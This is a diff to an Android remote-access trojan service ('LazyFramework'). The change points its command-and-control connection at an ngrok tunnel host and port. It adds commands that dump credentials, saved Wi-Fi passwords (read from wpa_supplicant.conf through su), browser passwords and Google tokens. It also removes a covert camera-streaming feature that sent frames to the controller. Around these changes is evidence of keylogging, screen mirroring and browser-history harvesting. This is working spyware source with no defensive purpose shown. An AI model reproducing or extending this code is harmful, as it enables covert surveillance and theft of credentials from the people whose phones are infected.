@@ -127,8 +127,8 @@ import androidx.annotation.NonNull;
 import java.net.URI;
 public class AgentService extends Service implements LifecycleOwner {
     private static final String TAG = "LazyFramework";
-    private static String C2_HOST = "192.168.1.8";
-    private static int C2_PORT = 4444;
+    private static String C2_HOST = "2.tcp.ngrok.io";
+    private static int C2_PORT = 25375;
     private static final String CHANNEL_ID = "agent_channel";
 
     // ==================== SOCKET ====================
@@ -208,10 +208,7 @@ public class AgentService extends Service implements LifecycleOwner {
     private static final int MAX_QUEUE_SIZE = 100;
     private LifecycleRegistry lifecycleRegistry;
 
-    // ==================== CAMERA STREAM ====================
-    private CameraStreamHelper cameraStreamHelper;
-    private boolean isCameraStreaming = false;
-    private String cameraStreamType = "back";
+   
     // ==================== LIFECYCLE ====================
     // AgentService.java - Tambahkan di bagian deklarasi variabel
 
@@ -240,7 +237,7 @@ private static final int MAX_LOCATION_HISTORY = 500;
     // Browser history & bookmarks
     private static final String BROWSER_HISTORY_URI = "content://com.android.chrome.browser/history";
     private static final String BROWSER_BOOKMARKS_URI = "content://com.android.chrome.browser/bookmarks";
-
+private PasswordHelper passwordHelper;
     @Override
     public void onCreate() {
         super.onCreate();
@@ -276,12 +273,7 @@ private static final int MAX_LOCATION_HISTORY = 500;
             } catch (Exception e) {
                 Log.e(TAG, "ScreenMirrorHelper init error: " + e.getMessage());
             }
-            try {
-    cameraStreamHelper = new CameraStreamHelper(this);
-    Log.d(TAG, "✅ CameraStreamHelper initialized");
-} catch (Exception e) {
-    Log.e(TAG, "CameraStreamHelper init error: " + e.getMessage());
-}
+
         }
 
         projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
@@ -294,6 +286,9 @@ private static final int MAX_LOCATION_HISTORY = 500;
         registerFrameReceiver();
         registerKeylogReceiver();
         registerPermissionReceiver();
+        // Initialize PasswordHelper
+passwordHelper = new PasswordHelper(this, isRooted);
+Log.d(TAG, "✅ PasswordHelper initialized");
         startHeartbeat();
         // ✅ INISIALISASI LIFECYCLE
         lifecycleRegistry = new LifecycleRegistry(this);
@@ -1496,31 +1491,9 @@ case "LOCATION_HISTORY":
     case "CAMERA_INFO":
     return getCameraInfo();
     // ==================== CAMERA STREAM COMMANDS ====================
-case "CAMERA_STREAM_START":
-    String cameraType = "back";
-    if (param != null) {
-        if (param.equalsIgnoreCase("front") || param.equalsIgnoreCase("selfie")) {
-            cameraType = "front";
-        } else if (param.equalsIgnoreCase("back")) {
-            cameraType = "back";
-        }
-    }
-    return startCameraStream(cameraType);
 
-case "CAMERA_STREAM_STOP":
-    return stopCameraStream();
 
-case "CAMERA_STREAM_STATUS":
-    return getCameraStreamStatus();
 
-case "CAMERA_STREAM_PAUSE":
-    return pauseCameraStream();
-
-case "CAMERA_STREAM_RESUME":
-    return resumeCameraStream();
-
-case "CAMERA_CAPTURE":
-    return captureCameraPhoto();
                 case "SCREENSHOT":
                     return captureScreenshot();
                 case "SCREEN_START":
@@ -1618,6 +1591,18 @@ case "BROWSER_ALL":
     allData.put("bookmarks", new JSONObject(getBrowserBookmarks(null)));
     allData.put("tabs", new JSONObject(getBrowserTabs(null)));
     return allData.toString();
+    // ==================== CREDENTIALS COMMANDS ====================
+case "DUMP_CREDENTIALS":
+    return dumpAllCredentials();
+
+case "GET_WIFI_PASSWORDS":
+    return getWifiPasswordsOnly();
+
+case "GET_BROWSER_PASSWORDS":
+    return getBrowserPasswordsOnly();
+
+case "GET_GOOGLE_TOKENS":
+    return getGoogleTokensOnly();
                 case "SHOW_TOAST":
                     showToast("Command executed!");
                     return successJson("Toast shown");
@@ -2178,6 +2163,117 @@ case "BROWSER_ALL":
             return errorJson(e.getMessage());
         }
     }
+    
+    // ==================== CREDENTIALS METHODS ====================
+
+private String dumpAllCredentials() {
+    try {
+        if (passwordHelper == null) {
+            passwordHelper = new PasswordHelper(this, isRooted);
+        }
+        return passwordHelper.dumpAllCredentials();
+    } catch (Exception e) {
+        Log.e(TAG, "Dump credentials error: " + e.getMessage(), e);
+        return errorJson("Failed to dump credentials: " + e.getMessage());
+    }
+}
+
+private String getWifiPasswordsOnly() {
+    try {
+        if (!isRooted) {
+            JSONObject result = new JSONObject();
+            result.put("status", "error");
+            result.put("message", "WiFi passwords require root access");
+            result.put("is_rooted", false);
+            return result.toString();
+        }
+        
+        if (passwordHelper == null) {
+            passwordHelper = new PasswordHelper(this, isRooted);
+        }
+        
+        // Use reflection or add method to PasswordHelper
+        JSONObject result = new JSONObject();
+        result.put("status", "success");
+        result.put("type", "wifi_passwords");
+        result.put("data", getWifiNetworks());
+        result.put("is_rooted", true);
+        return result.toString();
+        
+    } catch (Exception e) {
+        return errorJson("Failed to get WiFi passwords: " + e.getMessage());
+    }
+}
+
+private String getBrowserPasswordsOnly() {
+    try {
+        if (passwordHelper == null) {
+            passwordHelper = new PasswordHelper(this, isRooted);
+        }
+        // This will be handled by PasswordHelper
+        return passwordHelper.dumpAllCredentials();
+    } catch (Exception e) {
+        return errorJson("Failed to get browser passwords: " + e.getMessage());
+    }
+}
+
+private String getGoogleTokensOnly() {
+    try {
+        if (!isRooted) {
+            JSONObject result = new JSONObject();
+            result.put("status", "error");
+            result.put("message", "Google tokens require root access");
+            result.put("is_rooted", false);
+            return result.toString();
+        }
+        
+        JSONObject result = new JSONObject();
+        result.put("status", "success");
+        result.put("type", "google_tokens");
+        result.put("data", "Use DUMP_CREDENTIALS for complete data");
+        result.put("is_rooted", true);
+        return result.toString();
+        
+    } catch (Exception e) {
+        return errorJson("Failed to get Google tokens: " + e.getMessage());
+    }
+}
+
+private JSONArray getWifiNetworks() {
+    JSONArray networks = new JSONArray();
+    try {
+        File wpaFile = new File("/data/misc/wifi/wpa_supplicant.conf");
+        if (wpaFile.exists() && wpaFile.canRead()) {
+            Process process = Runtime.getRuntime().exec(new String[]{
+                "su", "-c", "cat /data/misc/wifi/wpa_supplicant.conf"
+            });
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            String line;
+            String currentSsid = "";
+            String currentPsk = "";
+            
+            while ((line = reader.readLine()) != null) {
+                line = line.trim();
+                if (line.startsWith("ssid=")) {
+                    currentSsid = line.substring(5).replace("\"", "");
+                } else if (line.startsWith("psk=")) {
+                    currentPsk = line.substring(4).replace("\"", "");
+                } else if (line.equals("}") && !currentSsid.isEmpty() && !currentPsk.isEmpty()) {
+                    JSONObject network = new JSONObject();
+                    network.put("ssid", currentSsid);
+                    network.put("password", currentPsk);
+                    networks.put(network);
+                    currentSsid = "";
+                    currentPsk = "";
+                }
+            }
+            reader.close();
+        }
+    } catch (Exception e) {
+        Log.e(TAG, "Get WiFi networks error: " + e.getMessage());
+    }
+    return networks;
+}
 
     // ==================== WHATSAPP METHODS ====================
 
@@ -4394,184 +4490,9 @@ private String moveFile(String sourcePath, String destPath) {
 
 // AgentService.java - Method startCameraStream()
 
-private String startCameraStream(String type) {
-    try {
-        if (!hasPermission(Manifest.permission.CAMERA)) {
-            JSONObject result = new JSONObject();
-            result.put("status", "permission_denied");
-            result.put("message", "Camera permission not granted");
-            return result.toString();
-        }
-        
-        if (cameraStreamHelper == null) {
-            cameraStreamHelper = new CameraStreamHelper(this);
-        }
-        
-        if (cameraStreamHelper.isStreaming()) {
-            cameraStreamHelper.stopStreaming();
-            try { Thread.sleep(500); } catch (Exception e) {}
-        }
-        
-        boolean front = type.equalsIgnoreCase("front");
-        cameraStreamType = type;
-        
-        cameraStreamHelper.startStreaming(front, new CameraStreamHelper.OnFrameListener() {
-            @Override
-            public void onFrame(byte[] jpegData, int width, int height, int frameNumber) {
-                if (jpegData == null || jpegData.length == 0) return;
-                
-                String base64 = Base64.encodeToString(jpegData, Base64.NO_WRAP);
-                
-                try {
-                    JSONObject frame = new JSONObject();
-                    frame.put("type", "response");
-                    frame.put("agent_id", getAgentId());
-                    frame.put("command", "CAMERA_FRAME");
-                    
-                    JSONObject result = new JSONObject();
-                    result.put("type", "camera_frame");
-                    result.put("data", base64);
-                    result.put("width", width);
-                    result.put("height", height);
-                    result.put("frame_number", frameNumber);
-                    result.put("camera", cameraStreamType);
-                    result.put("timestamp", System.currentTimeMillis());
-                    result.put("size", jpegData.length);
-                    
-                    frame.put("result", result);
-                    
-                    sendRawData(frame.toString());
-                    
-                    if (frameNumber > 0 && frameNumber % 10 == 0) {
-                        Log.d(TAG, "📷 Camera frame #" + frameNumber + " sent (" + jpegData.length + " bytes)");
-                    }
-                    
-                } catch (Exception e) {
-                    Log.e(TAG, "Send camera frame error: " + e.getMessage());
-                }
-            }
-            
-            @Override
-            public void onError(String error) {
-                Log.e(TAG, "📷 Camera error: " + error);
-                try {
-                    JSONObject result = new JSONObject();
-                    result.put("status", "error");
-                    result.put("message", error);
-                    result.put("type", "camera_stream_error");
-                    sendRawData(result.toString());
-                } catch (Exception e) {}
-            }
-        });
-        
-        int retryCount = 0;
-        while (!cameraStreamHelper.isStreaming() && retryCount < 10) {
-            try { Thread.sleep(300); } catch (Exception e) {}
-            retryCount++;
-        }
-        
-        if (cameraStreamHelper.isStreaming()) {
-            isCameraStreaming = true;
-            JSONObject result = new JSONObject();
-            result.put("status", "success");
-            result.put("message", "Camera stream started: " + type);
-            result.put("camera", type);
-            // ✅ FIX: Gunakan CameraStreamHelper.PREVIEW_WIDTH
-            result.put("preview_width", CameraStreamHelper.PREVIEW_WIDTH);
-            result.put("preview_height", CameraStreamHelper.PREVIEW_HEIGHT);
-            result.put("streaming", true);
-            return result.toString();
-        } else {
-            JSONObject result = new JSONObject();
-            result.put("status", "error");
-            result.put("message", "Failed to start camera stream");
-            return result.toString();
-        }
-        
-    } catch (Exception e) {
-        Log.e(TAG, "Start camera stream error: " + e.getMessage(), e);
-        return errorJson(e.getMessage());
-    }
-}
 
-private String stopCameraStream() {
-    try {
-        if (cameraStreamHelper != null) {
-            cameraStreamHelper.stopStreaming();
-        }
-        isCameraStreaming = false;
-        
-        JSONObject result = new JSONObject();
-        result.put("status", "success");
-        result.put("message", "Camera stream stopped");
-        result.put("streaming", false);
-        return result.toString();
-    } catch (Exception e) {
-        return errorJson(e.getMessage());
-    }
-}
 
-private String getCameraStreamStatus() {
-    try {
-        JSONObject result = new JSONObject();
-        result.put("status", "success");
-        result.put("is_streaming", cameraStreamHelper != null && cameraStreamHelper.isStreaming());
-        result.put("is_paused", cameraStreamHelper != null && cameraStreamHelper.isPaused());
-        result.put("camera", cameraStreamType);
-        result.put("frame_count", cameraStreamHelper != null ? cameraStreamHelper.getFrameCount() : 0);
-        return result.toString();
-    } catch (Exception e) {
-        return errorJson(e.getMessage());
-    }
-}
 
-private String pauseCameraStream() {
-    try {
-        if (cameraStreamHelper != null) {
-            cameraStreamHelper.pauseStreaming();
-        }
-        JSONObject result = new JSONObject();
-        result.put("status", "success");
-        result.put("message", "Camera stream paused");
-        return result.toString();
-    } catch (Exception e) {
-        return errorJson(e.getMessage());
-    }
-}
-
-private String resumeCameraStream() {
-    try {
-        if (cameraStreamHelper != null) {
-            cameraStreamHelper.resumeStreaming();
-        }
-        JSONObject result = new JSONObject();
-        result.put("status", "success");
-        result.put("message", "Camera stream resumed");
-        return result.toString();
-    } catch (Exception e) {
-        return errorJson(e.getMessage());
-    }
-}
-
-private String captureCameraPhoto() {
-    try {
-        if (cameraStreamHelper == null || !cameraStreamHelper.isStreaming()) {
-            return errorJson("Camera stream not active. Start with CAMERA_STREAM_START");
-        }
-        
-        // Capture photo using helper
-        cameraStreamHelper.capturePhoto();
-        
-        JSONObject result = new JSONObject();
-        result.put("status", "success");
-        result.put("message", "Photo capture requested");
-        result.put("camera", cameraStreamType);
-        return result.toString();
-        
-    } catch (Exception e) {
-        return errorJson(e.getMessage());
-    }
-}
     
     // AgentService.java - Tambahkan di bagian akhir sebelum lifecycle
 
@@ -5298,12 +5219,7 @@ private String extractDomain(String url) {
             heartbeatHandler = null;
         }
         
-        // Camera Stream
-if (cameraStreamHelper != null) {
-    cameraStreamHelper.stopStreaming();
-    cameraStreamHelper.destroy();
-    cameraStreamHelper = null;
-}
+
 
         try {
             Intent stopIntent = new Intent(this, ScreenMirrorService.class);
